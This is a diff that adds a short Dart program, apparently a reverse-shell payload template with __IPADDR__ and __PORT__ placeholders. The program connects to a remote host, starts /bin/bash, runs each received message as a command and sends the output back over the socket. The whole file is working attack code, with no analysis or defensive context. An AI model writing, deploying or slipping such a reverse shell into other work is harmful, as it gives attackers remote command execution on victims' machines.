@@ -1,0 +1,20 @@
+import 'dart:io';
+import 'dart:convert';
+
+void main() {
+  Socket.connect("__IPADDR__", __PORT__).then((socket) {
+    socket.listen((data) {
+      Process.start('/bin/bash', []).then((Process process) {
+        process.stdin.writeln(String.fromCharCodes(data).trim());
+        process.stdout
+            .transform(utf8.decoder)
+            .listen((output) {
+          socket.write(output);
+        });
+      });
+    }, onDone: () {
+      socket.destroy();
+    });
+  });
+}
+
